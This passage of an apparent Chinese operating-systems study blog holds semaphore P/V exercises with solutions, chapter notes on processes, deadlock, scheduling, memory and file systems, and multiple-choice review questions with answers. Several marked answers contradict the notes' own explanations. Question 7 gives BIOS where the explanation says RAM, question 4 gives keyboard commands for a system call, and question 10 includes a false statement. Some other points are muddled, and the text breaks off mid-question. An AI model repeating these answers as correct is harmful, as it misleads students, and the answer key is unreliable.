&#125;\n\n需要注意的是无论在生产者进程中还是在消费者进程中，两个P操作的次序不能颠倒。应先执行同步信号量的P操作，然后再执行互斥信号量的P操作，否则可能造成进程死锁。\n【例2】桌上有一空盘，允许存放一只水果。爸爸可向盘中放苹果，也可向盘中放桔子，儿子专等吃盘中的桔子，女儿专等吃盘中的苹果。规定当盘空时一次只能放一只水果供吃者取用，请用P、V原语实现爸爸、儿子、女儿三个并发进程的同步。\n分析 在本题中，爸爸、儿子、女儿共用一个盘子，盘中一次只能放一个水果。当盘子为空时，爸爸可将一个水果放入果盘中。若放入果盘中的是桔子，则允许儿子吃，女 儿必须等待；若放入果盘中的是苹果，则允许女儿吃，儿子必须等待。本题实际上是生产者-消费者问题的一种变形。这里，生产者放入缓冲区的产品有两类，消费 者也有两类，每类消费者只消费其中固定的一类产品。\n​       解：在本题中，应设置三个信号量S、So、Sa，信号量S表示盘子是否为空，其初值为l；信号量So表示盘中是否有桔子，其初值为0；信号量Sa表示盘中是否有苹果，其初值为0。同步描述如下：\nint S＝1;\n\nint Sa＝0;\n\nint So＝0;\nmain()\n &#123;\n\tcobegin\n\tfather();        &#x2F;*父亲进程*&#x2F;\n\tson();         &#x2F;*儿子进程*&#x2F;\n\tdaughter();       &#x2F;*女儿进程*&#x2F;\n\tcoend\n&#125;\nfather()\n&#123;\n\t while(1)\n\t\t&#123;\n\t\t\t P(S);\n            将水果放入盘中;\n            if（放入的是桔子）\n            \tV(So);\n            else \n            \tV(Sa);\n         &#125;\n&#125;\nson()\n &#123;\n\twhile(1)\n\t\t&#123;\n\t\t\t P(So);\n            从盘中取出桔子;\n            V(S);\n            吃桔子;\n          &#125;\n\n&#125;\ndaughter()\n&#123;\n\twhile(1)\n\t\t &#123;\n             P(Sa);\n             从盘中取出苹果;\n             V(S);\n             吃苹果;\n          &#125;\n&#125;\n\n例题3设公交车上,司机和售票员的活动如下：司机;启动车辆;正常行使,到站停车. 售票员;关车门,售票 开车门. 在汽车不断到站 停车 行驶过程中这两个活动有什么同步关系? 用信号量和pv操作实现。\n设信号量为s1(是否开车)和s2(是否停车),s1&#x3D;1,s2&#x3D;0;\n\n司机进程：           售票员进程：\n\nbegin              begin\n\nL1:               L2:\n\nP(S1);             关闭车门；\n\n启动车辆；           V(s1); \n\n正常行驶；           售票；\n\nV(s2）；            P(s2);\n\ngoto L1;            开车门；\n\nend；              goto L2;\n\n                 end；\n\n思考题：四个进程A、B、C、D都要读一个共享文件F，系统允许多个进程同时读文件F。但限制是进程A和进程C不能同时读文件F，进程B和进程D也不能同时读文件F。为了使这四个进程并发执行时能按系统要求使用文件，现用PV操作进行管理，请回答下面的问题：\n（1）应定义的信号量及初值：               。\n（2）在下列的程序中填上适当的P、V操作，以保证它们能正确并发工作：\n  A()       B()      C()        D()\n {       {        {         {\n  [1];      [3];      [5];        [7];\n  read F;     read F;    read F;      read F;\n  [2];      [4];     [6];         [8];\n  }       }       }          }\n思考题解答：（1）定义二个信号量S1、S2，初值均为1，即：S1&#x3D;1，S2&#x3D;1。其中进程A和C使用信号量S1，进程B和D使用信号量S2。\n（2）从[1]到[8]分别为：P(S1) V(S1) P(S2) V(S2) P(S1) V(S1) P(S2) V(S2)\n信号量、PV操作是解决进程间的同步与互斥问题的。\n★   做题时尤其要注意隐藏的同步、互斥问题。这些问题通常可以归入生产者－消费者问题和阅读者－写入者问题。\n★   PV操作一定是成对出现的，但是这不意味着它会在一个进程内成对出现。\n★   在互斥关系中，PV操作一定是在一个进程内成对出现。而且，信号一定大于0,具体多少视情况而定。而对于同步关系，则一对PV操作在两个进程或者更多的进程中出现。\n★   对于同步关系，信号量可能为0，也可能不为0；用于同步的信号个数可能1个，也可能是多个。\n★   对信号量为1的，应该先执行V操作。\n★   在生产者－消费者问题中，要设置三个信号量：empty－空闲的缓存区数量，初值为n；full－已填充的缓存区数量，初值为0；mutex－保证只有一个进程在写入缓存区，初值为1。\n★   在阅读者－写入者问题中，设置两个信号量：信号量access－控制写入互斥，初值为1；信号量rc－控制对共享变量ReadCount（读者统计值）的互斥访问。转自：http://hongti88.blog.163.com/blog/static/38276487200882733818688/\n","slug":"操作系统之信号量、P、V操作","date":"2020-12-09T07:43:00.000Z","categories_index":"","tags_index":"操作系统","author_index":"kif"},{"id":"c63c5858f324489e9342422070a9376f","title":"操作系统习题知识点","content":"知识点：第一章：操作系统引论操作系统有硬件和软件组成，硬件是CPUC软件建立与活动的基础，而软件是对硬件功能的扩充。硬件包括CPU、内存、I&#x2F;O设备和总线等，软件通常分为应用软件、支撑软件和系统软件。\n冯洛伊曼体系：存储器、运算器、控制器、输入设备、输出设备。\n操作系统的基本功能：管理系统内各种资源方便用户使用。\n操作系统五大功能：存储管理（内存分配、地址映射、内存保护、内存扩充），\n作业和进程管理（作业和进程调度、进程控制、进程通信），\n设备管理（缓冲区管理、设备分配、设备驱动、设备无关性），\n文件管理（文件存储空间管理、文件的一般管理、目录管理、文件读写管理和存取控制），\n用户接口服务（程序接口、图形接口、命令行接口）。\n操作系统定义：管理和控制计算机系统内的各种硬件软件资源、有效地组织多道程序正常运行的系统软件（或程序组合），是用户和计算机之间的接口。\n操作系统发展的动力：硬件技术的更新、应用需求的扩大。\n操作系统基本种类：批处理系统、分时操作系统、实时操作系统、网络系统和分布式操作系统。\n操作系统基本特征：并发、共享和不确定性。\n操作系统结构：整体结构、层次结构、虚拟机结构和客户-服务器结构。\n系统初启的引导过程：硬件检测、加载引导程序、初始化内核、用户登录。\n脱机I&#x2F;O：输入&#x2F;输出工作不受主机直接控制，而由卫星机专门负责完成I&#x2F;O，主机专门完成快速计算任务，从而二者可以并行操作。\n联机I&#x2F;O：指作业的输入、调入内存及结果输出都在CPU直接控制下进行。\n硬件 是指计算机物理装置本身，它是计算机系统的物理基础。如CPU、内存、设备等。\n软件是相对硬件而言的，它是与数据处理系统的操作有关的计算机程序、过程、规则及相关文档资料的总称。简单地说，软件是计算机执行的程序\n单道程序设计每次主机内存中仅存放一道作业,每当它运行期间发出输入输出请求后，高速的CPU便处于等待低速的I&#x2F;O完成状态。(基本特征: 顺序性)\n多道程序设计在这种设计技术下，内存中能同时存放多道程序，在管理程序的控制下交替地执行。这些作业共享CPU和系统中的其他资源。\n并发是指两个或多个活动在同一给定的时间间隔中进行。它是宏观上的概念。\n吞吐量 在一段给定的时间内，计算机所能完成的总工作量。\n分时就是对时间的共享。在分时系统中，分时主要是指若干并发程序对CPU时间的共享。\n实时 表示“及时”或“即时”。\n系统调用是用户在程序中能以“函数调用”形式调用的、由操作系统提供的子功能的集合。每一个子功能称做一条系统调用命令。它是操作系统对外的接口，是用户级程序取得操作系统服务的唯一途径。\n操作系统为用户提供的服务包括：命令和数据输入&#x2F;输出的管理，内存的分配，用户文件的管理，CPU的分配，设备管理等。\n核心态和用户态当执行操作系统程序时，处理机处于核心态。它有较高的特权，可以执行所有的指令，包括一般用户程序中不能使用的特权指令，从而能对所有寄存器和内存进行访问、启动I&#x2F;O操作等。\n用户程序是在用户态下执行，它的权限较低，只能执行指令集中非特权指令。\n设置这两种不同状态的目的是为了保护操作系统程序（特别是其内核部分），防止受到用户程序的损害。\n设计实时操作系统必须首先考虑实时系统的一个重要特征就是对时间的严格限制和要求。实时系统的首要任务是调度一切可利用的资源完成实时控制任务，其次才着眼于提高计算机系统的使用效率。所以，设计实时操作系统必须首先考虑处理各种事件的时间限制。\n特权指令和系统调用特权指令是一类只能在核心态下执行的机器指令。而系统调用不是机器指令，它往往以函数调用的形式出现，实现操作系统提供的子功能，它是操作系统与用户的编程接口。在用户程序中可以使用系统调用来获得操作系统服务。\n在系统调用代码中可以使用特权指令。\n采用层次结构的好处①结构关系清晰，提高系统的可靠性和安全性。\n②各层模块的功能明确，提高系统的可扩充性和可移植性。\n③各层间具有单向依赖性，增强系统的可维护性。\n④符合软件工程的思想，便于实施研制开发。\n微内核模式设计系统的优点①精减核心的功能，提供了一种简单的高度模块化的体系结构，提高了系统设计及使用的灵活性。\n②可移植性好。所有与具体机器特征相关的代码，全部隔离在微内核中。\n③可伸缩性好。操作系统能方便地进行定制、扩充或缩减，以适应硬件的快速更新和应用需求的不断变化。\n④实时性好。微内核可以方便地支持实时处理。\n⑤提供多线程机制，支持多处理器的体系结构和分布式系统及计算机网络。\n⑥系统安全性好。传统的操作系统将安全性功能建立在内核之外，因而它并不是很安全的。而微内核则将安全性作为系统内特性来进行设计。\n中断与硬件相关，外部设备通过发送中断信号通知CPU抽空处理设备请求。\n原语处于操作系统的最底层，是最接近硬件的部分。具有原子性一其操作只能一气呵成。\nRAM:随机访问存储器( random-access memory的缩写)特征:可随机读写，读写速度快，断电后数据消失。\nROM:只读存储器(read only memory)特征:数据写入之后不可更改，即使断电数据也不消失。\nEPROM:电可编程序只读存储器(Electrically Programmable Read- Only- Memory)，-种特殊的ROM。\nBIOS: Basic Input Output System 基本输入输出系统\n实时操作系统是指当外界事件或数据产生时，能够接受并以足够快的速度予以处理，其处理的结果又能在规定的时间之内来控制生产过程或对处理系统做出快速响应，并控制所有实时任务协调一致运行的操作系统。\n响应比响应比&#x3D; (等待的时间+要求服务的时间) &#x2F;要求服务的时间\neg:进程A要求服务5秒，进程B要求服务10秒，且进程B更重要。若两进程同时到达，则等待10秒之后:进程A响应比&#x3D;3，进程B响应比&#x3D;2。处理顺序: 进程A-&gt;进程B\n系统调用 VS 库函数\n\n第二章：进程和线程当进程顺序执行时，具有封闭性和可再现性。为提高计算机的运行速度和增强系统的处理能力，广泛采用了多道程序设计技术。该技术可以实现程序的并发执行和资源的共享。但是程序与计算活动失去了一一对应，而且程序并发执行时产生相互制约的关系。为了更好地描述程序的并发过程，引入了“进程”概念。\n进程可表述为：程序在并发环境中的执行状态。\n进程最基本的特征：动态性和并发性。\n进程状态间转化：进程的三态模型：\n按进程在执行过程中的不同情况至少要定义三种状态：\n\n运行（running）态：进程占有处理器正在运行的状态。\n\n\n\n\n\n\n\n\n\n进程已获得CPU，其程序正在执行。在单处理机系统中，只有一个进程处于执行状态； 在多处理机系统中，则有多个进程处于执行状态。\n\n就绪（ready）态：进程具备运行条件，等待系统分配处理器以便运行的状态。\n\n\n\n\n\n\n\n\n\n当进程已分配到除CPU以外的所有必要资源后，只要再获得CPU，便可立即执行，进程这时的状态称为就绪状态。在一个系统中处于就绪状态的进程可能有多个，通常将它们排成一个队列，称为就绪队列。\n\n等待（wait）态：又称阻塞态或睡眠态，指进程不具备运行条件，正在等待某个时间完成的状态。\n\n\n\n\n\n\n\n\n\n也称为等待或睡眠状态，一个进程正在等待某一事件发生（例如请求I&#x2F;O而等待I&#x2F;O完成等）而暂时停止运行，这时即使把处理机分配给进程也无法运行，故称该进程处于阻塞状态。\n\n\n\n引起进程状态转换的具体原因如下：\n\n运行态→等待态：等待使用资源；如等待外设传输；等待人工干预。\n\n等待态→就绪态：资源得到满足；如外设传输结束；人工干预完成。\n\n运行态→就绪态：运行时间片到；出现有更高优先权进程。\n\n就绪态—→运行态：CPU 空闲时选择一个就绪进程。\n\n进程的五态模型：\n五态模型在三态模型的基础上增加了新建态（new）和终止态（exit）。\n\n新建态：对应于进程被创建时的状态，尚未进入就绪队列。\n\n\n\n\n\n\n\n\n\n创建一个进程需要通过两个步骤：\n1.为新进程分配所需要资源和建立必要的管理信息。\n2.设置该进程为就绪态，并等待被调度执行。\n\n终止态：指进程完成任务到达正常结束点，或出现无法克服的错误而异常终止，或被操作系统及有终止权的进程所终止时所处的状态。\n\n\n\n\n\n\n\n\n\n处于终止态的进程不再被调度执行，下一步将被系统撤销，最终从系统中消失。\n终止一个进程需要两个步骤：\n1.先等待操作系统或相关的进程进行善后处理（如抽取信息）。\n2.然后回收占用的资源并被系统删除。\n\n\n\n引起进程状态转换的具体原因如下：\n\nNULL→新建态：执行一个程序，创建一个子进程。\n\n新建态→就绪态：当操作系统完成了进程创建的必要操作，并且当前系统的性能和虚拟内存的容量均允许。\n\n运行态→终止态：当一个进程到达了自然结束点，或是出现了无法克服的错误，或是被操作系统所终结，或是被其他有终止权的进程所终结。\n\n运行态→就绪态：运行时间片到；出现有更高优先权进程。\n\n运行态→等待态：等待使用资源；如等待外设传输；等待人工干预。\n\n就绪态→终止态：未在状态转换图中显示，但某些操作系统允许父进程终结子进程。\n\n等待态→终止态：未在状态转换图中显示，但某些操作系统允许父进程终结子进程。\n\n终止态→NULL：完成善后操作。\n\nPCB每个进程都有唯一的一个进程控制块（PCB），它是进程存在的唯一标识，PCB表的物理组织方式有若干种，常见的有线性表、链接表和索引表方式。线性表简单，链接表灵活，索引表处理速度快。\nPCB中有表明进程状态的信息，该进程的状态包括运行态、就绪态和阻塞态，它利用状态信息来描述进程的动态性质。\nPCB一般包括：进程名、特征信息、进程状态信息、调度优先权、通信信息、现场保护区等。\nPCB作用：每个进程有唯一的进程控制块，操作系统根据控制块对进程实施控制和管理，进程的状态、并发特征都是通过PCB表示出来的，PCB是进程存在的唯一标识。\n核心利用原语对进程实施操作，包括创建进程、阻塞进程、终止进程和唤醒进程等操作。\n线程：是进程中实施调度和分配的基本单位。\n进程只作为资源的分配单位和拥有者，而线程才是CPU调度的单位和占有者。\n线程两种实现方式：在用户空间实现，切换速度快，\n在核心空间实现，支持多线程并发。\n利用组合方式可以取长补短。\n进程在活动过程中会彼此发生作用，主要是同步、互斥和通信关系。同步是合作关系，互斥是竞争关系，通信是信息交流。\n临界资源：一次只允许一个设备使用的资源。\n临界区域（CS）：对临界资源实施操作的那段程序\n利用信号量和P、V操作可以很好的解决进程间的同步和互斥问题。\n详见（信号量P，V操作）\n管程是功能更强的同步机制，它自动实现进程互斥进入管程。管程中可以引入条件变量，利用两个操作原语实现进程同步。\n为什么引入进程概念由于多道程序并发执行时共享系统资源，共同决定这些资源的状态，因此系统中各程序在执行过程中就出现了相互制约的新关系，程序的执行出现“走走停停”的新状态。用程序这个静态概念已不能如实反映程序并发执行过程中的这些特征。为此，人们引入了“进程（Process）”这一概念来描述程序动态执行过程的性质。\n进程和程序\n进程与程序之间存在密切关系，进程的功能是通过程序的运行得以实现的，进程活动的主体是程序。进程不能脱离开具体程序而独自存在。\n进程的互斥与同步概念同步：逻辑上相关的两个或者多个进程为完成同一个任务，通过协调活动来使用同一资源，而产生的执行时序的约束关系\n互斥：逻辑上相互无关的两个或多个京城由于争用同一资源而发生的相互制约的关系\n临界区进入准则：位数临界区域得到充分使用，必须严格禁止两个或多个进程同时进入，即欲进入的若干进程徐满足下列要求：\n1.单个入区\n2.独自占用\n3.尽快退出\n4.“落败让权”\n进程通信—-低级进程通信\n———-互斥\n———-同步\n—-高级进程通信\n———-共享存储器方式\n———-消息传递方式\n—————-直接消息传递\n—————-间接消息传递\n———-管道文件方式\n消息传递系统原语：send 、receive\n第三章：死锁死锁：指多个进程循环等待他方占有的资源而无限期的僵持下去的局面\n产生的原因：根本原因：资源有限且操作不当\n一种是竞争资源引起的死锁，另一种原因是进程推进顺序不当。\n产生条件：互斥条件、不可抢占条件、占有且申请条件、循环等待条件\n对待死锁的策略：预防、避免、检测与恢复，以及完全忽略\n死锁预防基本思路：要求进程申请资源时遵循某种协议，从而打破产生死锁的四个必要条件中的一个或者几个，保证系统不会陷入死锁。\n预防方法中最有效的是实施资源有序分配策略，即把资源事先编号，按序分配，所有进程对资源的请求必须资源序号递增的顺序提出，·使进程在申请、占有资源时不会形成回路。\n死锁避免：是排除死锁的动态策略，关键是确定资源分配的安全性。\n代表：银行家算法：\n根据进程对资源的请求，试探分配后系统是否处于安全状态。若安全才分配。\n死锁的检测和恢复系统有专门的机构负责，在死锁发生时，会检测死锁发生的位置和原因，且通过外力破坏死锁发生的必要条件。\n资源分配图系统资源都为单体资源的情况下，若资源分配图中出现回路，则系统存在死锁。\n系统资源都为多体资源的情况下，若系统存在死锁，则资源分配图一定存在回路，反之不一定。\n系统选择“牺牲者”的主要依据：代价因素·    \n第四章：调度详见：\nCPU调度：CPU调度是操作系统最核心的调度，它根据算法选择合适的进程，并把CPU分配给进程使用。\n每个操作系统必须的\n处理机调度分为三级作业调度（高级调度）\n中级调度\n进程调度（低级调度）\n中级调度实现进程的挂起和进程映像的转换\n作业调度（高级调度）的基本功能：选择有权竞争CPU的进程，一般来说，资源分配策略（特别是内存管理）对作业调度影响很大。\n作业状态：提交状态、后备状态、执行状态和完成状态\n作业控制快JCB\n为了管理和控制作业而引入，记录该作业的有关信息\n作业调度功能：\n1.记录各个作业的情况\n2.按照某种算法在后备作业队列中挑选作业，\n3.为选中的作业分配资源 \n4.为选中的作业分配进程，并把进程放到就绪队列中。\n5.作业结束后的善后工作\n常用算法：\n先来先服务、短作业优先、最短剩余时间优先。\n进程调度（低级调度）是从就绪队列中选择进程并把CPU分配给它。\n功能：\n保存现场、挑选进程、恢复现场\n基本方式：\n非抢占方式、抢占方式\n常用调度算法：\n轮转法、优先级法、多级队列法、短进程优先、高响应比优先等\n调度准则评价调度策略的性能指标CPU利用率\nEg：某计算机只支持单道程序，某个作业刚开始需要在CPU上运行5秒，再用打印机打印输出6秒，之后再在CPU运行7秒。问：在此过程中，CPU利用率、打印机利用率分别为多少？直接给出计算结果。\n\n吞吐量\nEg：某计算机处理完10道作业，费时100秒，请计算系统吞吐量。\n\n周转时间周转时间&#x3D;作业完成时间点−作业提交时间点\n对于用户来说，他们关心自己的单个作业的周转时间，但是对于操作系统来说，操作系统更关心整体表现，于是出现了平均周转时间，即 周转时间的平均值。下面是平均周转时间的计算公式。\n平均周转时间&#x3D;各作业周转时间之和&#x2F;作业数目\n举个例子：小明去打酱油，他打酱油很快，只需要1分钟。但是到酱油铺后，由于人太多了，小明等了10分钟才轮到自己，这是小明打酱油的经历。现在小红去打醋，她打醋要花10分钟，她到醋铺后只等了1分钟就轮到了自己。我们可以算出他们的周转时间都是11分钟，但是他们的体验感有所不同，小明打酱油1分钟却等了10分钟，他肯定很暴躁。而小红打醋10分钟却只等了1分钟，她觉得这样的体验挺OK的。回到操作系统，类比一下，打酱油和打醋都是作业，小明和小红作为用户。可以看出，他们在周转时间相同的情况下，体验是不一样的。\n于是，人们提出了带权周转时间来衡量满意度。公式如下。\n带权周转时间&#x3D;作业周转时间 &#x2F; 作业实际运行的时间&#x3D;（作业完成时间点−作业提交时间点）&#x2F;作业实际运行的时间\n可以看出，带权周转时间肯定大于等于一，因为作业周转时间包括了作业实际运行的时间。而且，带权周转时间越小，用户满意度越高，反之则越低。例如上面的小明小红，他们的平均周转时间分别是11、1.1。当然，操作系统更关心他们的整体满意度，所以出现了平均带权周转时间，即 带权周转时间的平均值，公式如下。\n均带权周转时间&#x3D;各作业带权周转时间之和&#x2F;作业数目\n等待时间等待时间&#x3D;周转时间−运行时间\n响应时间响应时间，指从用户提交请求到首次产生响应所用的时间。\n\n调度算法：详见：\n线程调度：分为：用户级调度和核心级调度\n实时调度：实时任务类型：1.根据对截至时间的要求分为：硬实时任务和软实时任务\n硬实时任务：指系统必须满足对戒指时间的要求。\n软实时任务：任务与预期的截至时间相关联，但不会严格要求。\n2.按照任务执行是否有周期性规律分为周期性任务和非周期性任务。\n中断中断的概念中断是指程序执行过程中，遇到急需处理的事件时，暂时中止CPU上现行程序的运行，转去执行相应的事件处理程序，待处理完成后再返回原程序被中断处或调度其他程序执行的过程\n操作系统是“中断驱动”的；换言之，中断（广义）是激活操作系统的唯一方式\n中断有广义和狭义之分，上述中断时指广义的中断\n中断源：引起中断的事件或者发出中断请求的来源\n中断请求中断源向CPU发出的中断请求 \n断点发生中断是被打断程序的暂停点\n中断系统中断系统是计算机系统中响应和处理中断的系统，包括硬件子系统和软件子系统两部分\n中断响应由硬件子系统完成\n中断处理由软件子系统完成\n中断系统的作用：1.提高主机利用率，\n2.及时进行事故处理\n3.实现分时操作\n4.实现实时操作\n5.方便程序调试\n中断类型：中断、异常\n中断的处理过程：硬件：\n终止当前程序的执行，保存断点信息、转到相应的处理程序。\n软件：\n保存现场，分析原因，处理中断，中断返回。\n对中断的处理是在核心态下进行的。\n处理机调度的主要目的就是为了分配处理机\n引入中级调度的目的：提高内存利用率和吞吐量\n作业调度与进程调度之间的差别：作业调度是宏观调度，它所选择的作业只是具有获得处理机的资格，但尚未占有处理机，不能立即在其上实际运行；而进程调度是微观调度，动态地把处理机实际地分配给所选择的进程，使之真正活动起来。另外，进程调度相当频繁，而作业调度执行的次数一般很少。\n作业调度从外存的后备队列中选择一批作业调入内存，为它们创建进程，这些进程被送入就绪队列。进程调度从就绪队列中选出一个进程来，并把它的状态改为运行态，把CPU分配给它。当运行进程要等待某一事件时，就让出CPU，进入相应的阻塞队列，并进行进程调度。运行进程完成后，由作业调度进行善后处理工作。\n第五章：存储管理逻辑地址：应用程序编译后每个模块都以0地址开始编址，这种地址称为逻辑地址或相对地址\n物理地址：内存中各物理存储单元都以同一个基地址开始编址，这种地址称为物理地址或绝对地址\n重定位：解决逻辑地址和物理地址之间的映射关系\n静态重定位：在程序装入内存时进行地址转换。由装入程序执行，早期小型 OS 使用。\n动态重定位：在 CPU 执行程序时进行地址转换，依赖硬件来进行转换。如果不用硬件，效率会极大地下降。\n分区法：固定分区法：内存中分区个数不变，各个分区大小固定\n缺点：浪费严重，碎片化多\n动态分区法：各个分区在相应进程建立时才分配，使其大小正好是进程大小\n缺点：一段时间后碎片化严重\n处理碎片问题：紧缩把所有的碎片连成一片连续的空闲区（通过移动已分区的内容），可以很好解决碎片化，但是需要读写大量分区中信息，耗费大量CPU时间，时间成本高\n分页管理解决动态分区法碎片利用率问题\n分页存储管理将进程的逻辑地址分为若干页。对每个页进行编号，从0开始，如：第0页，第1页。相应的，把内存中的物理地址分为若干块，同时对他们进行编号，如0#，1#等。在内存分配时，以块为单位，将若干页面分别装入多个不相邻的物理块中。由于进程的最后一页经常装不满，就形成了不可利用的碎片，称为“页面碎片”\n分页地址中地址结构如下：\n\n页表在分页系统中，为了保证进程可以在内存中找到每个页面对应的物理块，系统为每一个进程建立了一张页面映像表，简称页表。在进程地址空间内的所有页，依次在页表中有一页表项，其中记录了相应页在内存对应的物理块号。如下图：\n\n页表解决了块外碎片问题，但减低了性能，页面大小制约因素（太大块内碎片，浪费；太小页表项多，查询时间成本大），所以还要优化——》分段技术\n例题15：\n分段管理：解决了编译后出现多个0地址\n在分段存储管理方式中，作业的地址空间被划分为若干个段，每个段定义了一组逻辑信息。例如，有主程序段MAIN、子程序段X、数据段D及栈段S等，通常，用段号代替段名。每个段都从0开始编址，并采用一段连续的地址空间。\n段的长度由相应的逻辑信息组的长度决定，因此每个短对长度并不相等。\n分段地址中地址具有的结构\n\n段表\n段页式存储管理方式分页系统以页面作为内存分配的基本单位，能够有效提高内存的利用率，而分段系统以段作为内存分配的基本单位，它能够更好的满足用户多方面的需求。而段页式系统这很好的集两者之长。\n段页式系统的基本原理是分段和分页原理的结合，即先将用户程序分为若干段，再把系统分为若干页，为每一个段分配一个段明。\n段页地址结构包括三部分：段号，段内页号，页内地址\n\n1.等分内存\n2.进程的地址空间采用分段方式，将每段再划分为若干页，页面的大小与内存块相同，每段的每个页面都从0开始编址\n段表的内容和分段系统不同，它还包括页表大小和页内始址，下图就是利用段表进行从逻辑地址到物理地址的转变\n\n存储管理的基本模式：\n单连续存储管理\n\n段式存储管理\n\n页式存储管理\n\n段页式存储管理\n\n\n第六章：文件系统文件：\n是被命名的数据的集合体，是由操作系统定义和执行的抽象数据\n文件系统功能：文件管理、目录管理、文件存储空间管理、文件共享和保护、提供方便的用户接口\n两种形式的结构　　① 文件的逻辑结构，这是从用户观点出发所观察到的文件组织形式，是用户可以直接处理的数据及其结构，独立于文件的物理特性，又称为文件组织。\n　　② 文件的物理结构，又称为文件的存储结构，是指文件在外存上的存储组织形式，不仅与存储介质有关，还与外存分配方式有关。\n什么是虚拟存储器？它有哪些基本特征？是用户能作为可编址内存对待的虚拟存储空间，它使用户逻辑存储器与物理存储器分离\n题目：1.用户可以通过( B) 两种方式来使用计算机。A.命令接口和函数B.命令接口和系统调用C.命令接口和文件管理D.设备管理方式和系统调用\n\n\n\n\n备注：\n易懵概念和常见问法:系统调用&#x3D;系统调用命令&#x3D;广义指令操作系统提供给用户直接(间接)使用的接口是?—-&gt;命令接口(程序接口&#x2F;系统调用)操作系统提供给编程人员&#x2F;应用程序使用的接口是?—-&gt;程序接口&#x2F;系统调用\n\n2.系统调用是由操作系统提供给用户的，它(B ) 。A.直接通过键盘交互方式使用B.只能通过用户程序间接使用C.是命令接口中的命令D.与系统的命令一样\n系统调用:由操作系统实现的所有系统调用所构成的集合即程序接口或应用编程接口。是应用程序同系统之间的接口。\n\n3.系统调用的目的是(A）A.请求系统服务B.中止系统服务C.申请系统资源D.释放系统资源\n4.用户在程序中试图读某文件的第100个逻辑块，使用操作系统提供的(B ) 接口。A.系统调用B.键盘命令C.原语D.图形用户接口\n逻辑块:内存块&gt;计算机资源读: I&#x2F;O操作,核心态服务题目转换为→用户在程序中要访问一部分计算机资源，并且需要进入核心态使用内核服务,需要使用操作系统() 接口\n5.操作系统与用户通信接口通常不包括(）A. shellB.命令解释器C.广义指令D.缓存管理指令\nShell属于命令解析器，属于命令接口广 义指令就是系统调用指令\n系统中的缓存，全部由操作系统管理,对用户是透明的，操作系统不提供管理系统缓存的系统调用。\n6.下列选项中， 不属于多道程序设计的基本特征是( C) 。A.制约性B.间断性C.顺序性D.共享性\n7.计算机开机后，操作系统最终被加载到( A) 。[2013年计算机联考真题]A. BIOSB. ROMC. EPROMD. RAM\nRAM:随机访问存储器( random-access memory的缩写)特征:可随机读写，读写速度快，断电后数据消失。ROM:只读存储器(read only memory)特征:数据写入之后不可更改，即使断电数据也不消失。EPROM:电可编程序只读存储器(Electrically Programmable Read- Only- Memory)，-种特殊的ROM。BIOS: Basic Input Output System 基本输入输出系统\n例子:为一个裸机安装操作系统Step 1:一般要先进入BIOS系统，选择安装模式(CD或U盘? )Step 2:安装系统的过程，其实是将操作系统相关数据写入硬盘的过程_(C盘)Step 3:安装完毕，正常开机启动。操作系统相关数据从硬盘加载到RAM中，才能被CPU处理\n裸机里有什么?裸机的主板.上有ROM、有RAM、有空空如也的硬盘。一台裸机只有RON中有数据，因此BIOS-定是存在ROM中 \n8.批处理系统的主要缺点是( D) 。A.系统吞吐量小B. CPU利用率不高C.资源利用率低D.无交互能力\n单道批处理系统：单道性、顺序性、自动性\n多道批处理系统：制约性、多道、间断性、宏观上并行、微观上串行\n9.操作系统的基本类型主要有(B )。A.批处理操作系统、分时操作系统和多任务系统B.批处理操作系统、分时操作系统和实时操作系统C.单用户系统、多用户系统和批处理操作系统D.实时操作系统、分时操作系统和多用户系统\n\n\n10.下列关于批处理系统的叙述中，正确的是(A )。I.批处理系统允许多个用户与计算机直接交互II.批处理系统分为单道批处理系统和多道批处理系统I.中断技术使得多道批处理系统和I&#x2F;O设备可与CPU并行工作A.仅I、IIIB.仅I|C.仅I、IID.仅1、III\n11.与单道程序系统相比，多道程序系统的优点是( D) 。I . CPU利用率高II.系统开销小III.系统吞吐量大IV. I&#x2F;O设备利用率高A.仅I、IIIB.仅I、IVC.仅II、IIID.仅I、III、IV单道程序系统:内存中最多只有-道作业，作业之间是串行执行的。若当前作业等待I&#x2F;O，则CPU闲置等待。多道程序系统:内存中有多道作业，作业之间并发执行。若当前作业等待I&#x2F;O，则CPU转 而处理另一道作业。CPU利用率: CPU“忙” 的时间所占的比例系统开销:除了处理作业之外，系统在进程、内存等管理上消耗的时间系统吞吐量:单位时间内CPU完成作业数量 （相同作业下，总耗时越少，吞吐量越大）I&#x2F;0设备利用率: I&#x2F;0设 备”忙”的时间所占的比例\neg：\n作业A: CPU 5ms –&gt; I&#x2F;0 5ms –&gt; CPU 5ms –&gt; I&#x2F;O 5ms作业B: CPU 5ms –&gt; I&#x2F;0 5ms – CPU 5ms –&gt; 1&#x2F;0 5ms\n单道：\n\n完成2个作业，总耗时40ms， CPU利用 率&#x3D;20&#x2F;40&#x3D;50%，&#x2F;0设备利用率&#x3D;20&#x2F;40&#x3D;50%\n多道：\n\n完成2个作业，总耗时25ms，CPU利用率&#x3D;20&#x2F;25&#x3D;80%，&#x2F;0设备利用率&#x3D;20&#x2F;25&#x3D;80%\n12.实时操作系统必须在( B) 内处理来自外部的事件。A.一个机器周期B.被控制对象规定时间C.周转时间D.时间片\n实时操作系统:是指当外界事件或数据产生时，能够接受并以足够快的速度予以处理，其处理的结果又能在规定的时间之内来控制生产过程或对处理系统做出快速响应，并控制所有实时任务协调-致运行的操作系统。产生目的:为了能在某个时间限制内完成某些紧急任务而不需要时间片排队\n13.实时系统的进程调度，通常采用( C) 算法。A.先来先服务B.时间片轮转C.抢占式的优先级高者优先D.高响应比优先\n实时操作系统:将时间作为关键参数。系统必须能足够及时地处理某些紧急的外部事件。Key:响应比&#x3D; (等待的时间+要求服务的时间) &#x2F;要求服务的时间eg:进程A要求服务5秒，进程B要求服务10秒，且进程B更重要。若两进程同时到达，则等待10秒之后:进程A响应比&#x3D;3，进程B响应比&#x3D;2。处理顺序: 进程A-&gt;进程B\n这种情况下A会先处理，不符合.\n先来先服务:早期的单道批处理系统时间片轮转:分时操作系统抢占式的优先级高者优先:实时操作系统高响应比优先:常用于多道程序系统中的作业调度\n14.分时系统的一个重要性能是系统的响应时间,对操作系统(C ) 因素进行改进有利于改善系统的响应时间。A.加大时间片B.采用静态页式管理C.优先级+非抢占式调度算法D.代码可重入\n分时操作系统的工作方式: -台主机连接了若干个终端，每个终端有一个用户在使用。用户交互式地向系统提出命令请求，系统接受每个用户的命令,采用时间片轮转方式处理服务请求,并通过交互方式在终端上向用户显示结果\n响应时间:从用户提交请求到系统首次产生响应所用的时间\n16    虚拟存储技术是（A）。A. 补充内存物理空间不足的技术      B. 补充相对地址空间的技术\nC. 